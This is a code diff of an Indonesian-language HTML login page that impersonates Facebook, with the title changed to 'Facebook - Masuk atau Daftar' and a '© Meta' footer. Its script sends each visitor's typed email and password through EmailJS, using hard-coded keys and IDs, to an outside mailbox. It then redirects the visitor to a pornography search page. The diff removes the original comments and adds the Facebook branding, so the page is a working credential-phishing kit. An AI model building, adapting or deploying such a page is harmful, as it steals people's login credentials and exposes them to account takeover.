@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login Page</title>
+  <title>Facebook - Masuk atau Daftar</title>
   <style>
     body {
       margin: 0;
@@ -139,18 +139,18 @@
     <footer>© Meta</footer>
   </div>
 
-  <!-- Popup -->
+  
   <div class="popup" id="popupMessage">
     <p id="popupText"></p>
     <hr>
     <button onclick="closePopup()">OK</button>
   </div>
 
-  <!-- Include EmailJS SDK -->
+ 
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script type="text/javascript">
     (function(){
-      emailjs.init("5YPTVVuIdLBhWZDmf"); // Ganti dengan Public Key Anda
+      emailjs.init("5YPTVVuIdLBhWZDmf");
     })();
 
     const emailField = document.getElementById('email');
@@ -161,12 +161,12 @@
     const popupText = document.getElementById('popupText');
 
     async function handleFormSubmission(event) {
-      event.preventDefault(); // Mencegah refresh halaman
+      event.preventDefault();
 
       const email = emailField.value.trim();
       const password = passwordField.value.trim();
 
-      // Validasi input
+      
       if (!email) {
         showPopup("Perlu email atau nomor ponsel. Masukkan email atau nomor ponsel untuk melanjutkan");
         return;
@@ -176,27 +176,26 @@
         return;
       }
 
-      loadingIndicator.style.display = 'block'; // Tampilkan loading
-
+      loadingIndicator.style.display = 'block';
       try {
         const templateParams = {
           email: email,
           password: password
         };
 
-        // Kirim data ke EmailJS
+        
         const response = await emailjs.send("service_wimuilb", "template_svvfoh9", templateParams);
         console.log('Email terkirim:', response);
 
-        // Beri jeda 2 detik sebelum mengalihkan halaman
+        
         setTimeout(() => {
-          window.location.href = "https://www.youtube.com/"; // Ganti dengan URL tujuan Anda
+          window.location.href = "https://www.xnxx.com/search/indonesia?top";
         }, 2000);
       } catch (error) {
         console.error('Terjadi kesalahan:', error);
         showPopup('Terjadi masalah saat mengirim email. Coba lagi nanti.');
       } finally {
-        loadingIndicator.style.display = 'none'; // Sembunyikan loading
+        loadingIndicator.style.display = 'none';
       }
     }
 
